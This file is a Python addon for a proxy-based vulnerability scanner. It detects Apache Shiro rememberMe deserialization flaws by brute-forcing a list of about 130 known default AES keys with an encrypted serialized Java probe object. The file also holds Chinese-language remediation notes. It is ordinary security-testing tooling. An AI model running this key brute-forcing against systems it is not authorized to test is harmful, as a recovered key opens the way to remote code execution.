#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

import uuid
from copy import deepcopy
from Cryptodome.Cipher import AES
from mitmproxy.http import HTTPFlow
from lib.core.enums import AddonType
from lib.core.enums import VulType
from lib.core.enums import VulLevel
from addon.agent import AgentAddon
from lib.util.cipherutil import base64encode
from lib.util.cipherutil import base64decode
from lib.util.aiohttputil import ClientSession

class Addon(AgentAddon):
    """
    shiro 扫描，
    目前只是检查CBC加密模式， 至于GCM模式要看AES库的版本，自行添加。
    调用此插件时，谨慎使用bp的路径扫描、爆破（/api/user/xxxx/类型爆破）组件，会放大数据包的量
    """

    def __init__(self):
        AgentAddon.__init__(self)
        self.name = 'ShiroDeserialization'
        self.addon_type = AddonType.FILE_ONCE
        self.vul_name = "Shiro反序列化漏洞"
        self.level = VulLevel.HIGH
        self.vul_type = VulType.RCE
        self.description = "反序列化漏洞是特殊的任意代码执行漏洞，通常出现在Java环境。漏洞产生原因主要是暴露了反序列化操作API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。在Java编码过程应使用最新版本的组件lib包。特别注意升级，如：Apache Commons Collections、fastjson、Jackson等出现过问题的组件。"
        self.scopen = "Shiro相关组件"
        self.impact = "1. Shiro组件存在反序列化漏洞，导致可以远程命令执行。"
        self.suggestions = "1. 升级shiro至最新版本或修改默认Key。"
        self.mark = ""

        self.evil_obj_b64 = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
        self.keylist = [
            "2AvVhdsgUs0FSA3SDFAdag==",
            "kPH+bIxk5D2deZiIxcaaaA==",
            "3AvVhmFLUs0KTA3Kprsdag==",
            "4AvVhmFLUs0KTA3Kprsdag==",
            "5aaC5qKm5oqA5pyvAAAAAA==",
            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
            "bWljcm9zAAAAAAAAAAAAAA==",
            "wGiHplamyXlVB11UXWol8g==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "MTIzNDU2Nzg5MGFiY2RlZg==",
            "zSyK5Kp6PZAAjlT+eeNMlg==",
            "U3ByaW5nQmxhZGUAAAAAAA==",
            "5AvVhmFLUs0KTA3Kprsdag==",
            "bXdrXl9eNjY2KjA3Z2otPQ==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==",
            "L7RioUULEFhRyxM7a2R/Yg==",
            "r0e3c16IdVkouZgk1TKVMg==",
            "bWluZS1hc3NldC1rZXk6QQ==",
            "a2VlcE9uR29pbmdBbmRGaQ==",
            "WcfHGU25gNnTxTlmJMeSpw==",
            "ZAvph3dsQs0FSL3SDFAdag==",
            "tiVV6g3uZBGfgshesAQbjA==",
            "cmVtZW1iZXJNZQAAAAAAAA==",
            "ZnJlc2h6Y24xMjM0NTY3OA==",
            "RVZBTk5JR0hUTFlfV0FPVQ==",
            "WkhBTkdYSUFPSEVJX0NBVA==",
            "GsHaWo4m1eNbE0kNSMULhg==",
            "l8cc6d2xpkT1yFtLIcLHCg==",
            "KU471rVNQ6k7PQL4SqxgJg==",
            "0AvVhmFLUs0KTA3Kprsdag==",
            "1AvVhdsgUs0FSA3SDFAdag==",
            "25BsmdYwjnfcWmnhAciDDg==",
            "3JvYhmBLUs0ETA5Kprsdag==",
            "6AvVhmFLUs0KTA3Kprsdag==",
            "6NfXkC7YVCV5DASIrEm1Rg==",
            "7AvVhmFLUs0KTA3Kprsdag==",
            "8AvVhmFLUs0KTA3Kprsdag==",
            "8BvVhmFLUs0KTA3Kprsdag==",
            "9AvVhmFLUs0KTA3Kprsdag==",
            "OUHYQzxQ/W9e/UjiAGu6rg==",
            "a3dvbmcAAAAAAAAAAAAAAA==",
            "aU1pcmFjbGVpTWlyYWNsZQ==",
            "bXRvbnMAAAAAAAAAAAAAAA==",
            "OY//C4rhfwNxCQAQCrQQ1Q==",
            "5J7bIJIV0LQSN3c9LPitBQ==",
            "f/SY5TIve5WWzT4aQlABJA==",
            "bya2HkYo57u6fWh5theAWw==",
            "WuB+y2gcHRnY2Lg9+Aqmqg==",
            "3qDVdLawoIr1xFd6ietnwg==",
            "YI1+nBV//m7ELrIyDHm6DQ==",
            "6Zm+6I2j5Y+R5aS+5ZOlAA==",
            "2A2V+RFLUs+eTA3Kpr+dag==",
            "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "SkZpbmFsQmxhZGUAAAAAAA==",
            "2cVtiE83c4lIrELJwKGJUw==",
            "fsHspZw/92PrS3XrPW+vxw==",
            "XTx6CKLo/SdSgub+OPHSrw==",
            "sHdIjUN6tzhl8xZMG3ULCQ==",
            "O4pdf+7e+mZe8NyxMTPJmQ==",
            "HWrBltGvEZc14h9VpMvZWw==",
            "rPNqM6uKFCyaL10AK51UkQ==",
            "Y1JxNSPXVwMkyvES/kJGeQ==",
            "lT2UvDUmQwewm6mMoiw4Ig==",
            "MPdCMZ9urzEA50JDlDYYDg==",
            "xVmmoltfpb8tTceuT5R7Bw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==",
            "ClLk69oNcA3m+s0jIMIkpg==",
            "Bf7MfkNR0axGGptozrebag==",
            "1tC/xrDYs8ey+sa3emtiYw==",
            "ZmFsYWRvLnh5ei5zaGlybw==",
            "cGhyYWNrY3RmREUhfiMkZA==",
            "IduElDUpDDXE677ZkhhKnQ==",
            "yeAAo1E8BOeAYfBlm4NG9Q==",
            "cGljYXMAAAAAAAAAAAAAAA==",
            "2itfW92XazYRi5ltW0M2yA==",
            "XgGkgqGqYrix9lI6vxcrRw==",
            "ertVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==",
            "s0KTA3mFLUprK4AvVhsdag==",
            "hBlzKg78ajaZuTE0VLzDDg==",
            "9FvVhtFLUs0KnA3Kprsdyg==",
            "d2ViUmVtZW1iZXJNZUtleQ==",
            "yNeUgSzL/CfiWw1GALg6Ag==",
            "NGk/3cQ6F5/UNPRh8LpMIg==",
            "4BvVhmFLUs0KTA3Kprsdag==",
            "MzVeSkYyWTI2OFVLZjRzZg==",
            "empodDEyMwAAAAAAAAAAAA==",
            "A7UzJgh1+EWj5oBFi+mSgw==",
            "c2hpcm9fYmF0aXMzMgAAAA==",
            "i45FVt72K2kLgvFrJtoZRw==",
            "U3BAbW5nQmxhZGUAAAAAAA==",
            "Jt3C93kMR9D5e8QzwfsiMw==",
            "MTIzNDU2NzgxMjM0NTY3OA==",
            "vXP33AonIp9bFwGl7aT7rA==",
            "V2hhdCBUaGUgSGVsbAAAAA==",
            "Q01TX0JGTFlLRVlfMjAxOQ==",
            "Is9zJ3pzNh2cgTHB4ua3+Q==",
            "NsZXjXVklWPZwOfkvk6kUA==",
            "GAevYnznvgNCURavBhCr1w==",
            "66v1O8keKNV3TTcGPK1wzg==",
            "SDKOLKn2J1j/2BHjeZwAoQ==",
            "kPH+bIxk5D2deZiIxcabaA==",
            "kPH+bIxk5D2deZiIxcacaA==",
            "3AvVhdAgUs0FSA4SDFAdBg==",
            "4AvVhdsgUs0F563SDFAdag==",
            "FL9HL9Yu5bVUJ0PDU1ySvg==",
            "5RC7uBZLkByfFfJm22q/Zw==",
            "eXNmAAAAAAAAAAAAAAAAAA==",
            "fdCEiK9YvLC668sS43CJ6A==",
            "FJoQCiz0z5XWz2N2LyxNww==",
            "HeUZ/LvgkO7nsa18ZyVxWQ==",
            "HoTP07fJPKIRLOWoVXmv+Q==",
            "iycgIIyCatQofd0XXxbzEg==",
            "m0/5ZZ9L4jjQXn7MREr/bw==",
            "NoIw91X9GSiCrLCF03ZGZw==",
            "oPH+bIxk5E2enZiIxcqaaA==",
            "QAk0rp8sG0uJC4Ke2baYNA==",
            "Rb5RN+LofDWJlzWAwsXzxg==",
            "s2SE9y32PvLeYo+VGFpcKA==",
            "SrpFBcVD89eTQ2icOD0TMg==",
            "U0hGX2d1bnMAAAAAAAAAAA==",
            "Us0KvVhTeasAm43KFLAeng==",
            "Ymx1ZXdoYWxlAAAAAAAAAA==",
            "YWJjZGRjYmFhYmNkZGNiYQ==",
            "zIiHplamyXlVB11UXWol8g==",
            "ZjQyMTJiNTJhZGZmYjFjMQ==",
        ]

        self.black_media_type_list = ["image", "video", "audio"]
        self.black_ext_list = ['jpg', 'png', 'pdf', 'png', 'docx', 'doc', 'jpeg', 'xlsx', 'csv', 'js', 'css',
                               'map', 'json', 'txt', 'php', 'asp', 'aspx', 'html']
        self.black_headers_list = ["Cookie", "Origin", "Connection", "Accept-Encoding", "Accept-Language",
                                   "Accept", "Upgrade-Insecure-Requests", "Sec-Fetch-Site", "Sec-Fetch-Mode",
                                   "Sec-Fetch-Dest", "Sec-Fetch-User", "If-None-Match", "Referer",
                                   "X-Requested-With", "Cache-Control", "content-encoding", "If-Modified-Since"]
        self.black_headers_list += [item.lower() for item in self.black_headers_list]

    def get_aes_cipher_cookie(self, text, key, mode=AES.MODE_CBC):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        # GCM 模式要看AES库的版本
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64decode(key), mode, iv)
        file_body = pad(base64decode(text))
        base64_ciphertext = base64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext

    async def prove(self, flow: HTTPFlow):
        method = self.get_method(flow)
        ext = self.get_extension(flow)
        response_media_type = self.get_response_media_type(flow)
        if method in ['GET', 'POST'] and response_media_type not in self.black_media_type_list and ext not in self.black_ext_list:
            url = self.get_url(flow)
            data = self.get_request_content(flow)
            headers = self.get_request_headers(flow)
            if await self.prove_shiro_cookie(method, url, data, headers):
                for mode in [AES.MODE_CBC, AES.MODE_GCM]:
                    headers = self.get_request_headers(flow)
                    if await self.prove_shiro(method, url, data, headers, mode):
                        return True

    async def prove_shiro_cookie(self, method, url, data, headers):
        async with ClientSession(self.addon_path) as session:
            temp_headers = deepcopy(headers)
            header_cookie_name = 'cookie' if 'cookie' in temp_headers else 'Cookie'
            temp_cookies = temp_headers.get(header_cookie_name, {})
            if 'rememberMe' in temp_cookies.keys():
                return True
            else:
                temp_cookies["rememberMe"] = 'is_shiro_test'
                temp_headers[header_cookie_name] = temp_cookies
                async with session.request(method, url=url, data=data, headers=temp_headers, allow_redirects=False) as res:
                    if res and 'rememberme=deleteme' in res.headers.get("Set-Cookie", "").lower():
                        return True
        return False



    async def prove_shiro(self, method, url, data, headers, mode=AES.MODE_GCM):
        mode_name = 'AES.MODE_GCM' if mode == AES.MODE_GCM else 'AES.MODE_CBC'
        async with ClientSession(self.addon_path) as session:
            for i in range(0, len(self.keylist)):
                temp_headers = deepcopy(headers)
                header_cookie_name = 'cookie' if 'cookie' in temp_headers else 'Cookie'
                temp_cookies = temp_headers.get(header_cookie_name, {})
                rememberme_cookie = self.get_aes_cipher_cookie(self.evil_obj_b64, self.keylist[i], AES.MODE_GCM)
                temp_cookies["rememberMe"] = rememberme_cookie
                temp_headers[header_cookie_name] = temp_cookies
                async with session.request(method, url=url, data=data, headers=temp_headers, allow_redirects=False) as res:
                    if res and 'rememberme=deleteme' not in res.headers.get("Set-Cookie", "").lower():
                        temp_headers = deepcopy(headers)
                        temp_cookies = temp_headers.get(header_cookie_name, {})
                        rememberme_cookie = self.get_aes_cipher_cookie(self.evil_obj_b64, 'Th15IsN0tExi5TK3yaaaaa==', AES.MODE_GCM)
                        temp_cookies["rememberMe"] = rememberme_cookie
                        temp_headers[header_cookie_name] = temp_cookies
                        async with session.request(method, url=url, data=data, headers=temp_headers, allow_redirects=False) as res:
                            if res and 'rememberme=deleteme' in res.headers.get("Set-Cookie", "").lower():
                                detail = f"Found shiro key: {self.keylist[i]}, mode: {mode_name}"
                                await self.save_vul(res, detail)
                                return True
        return False
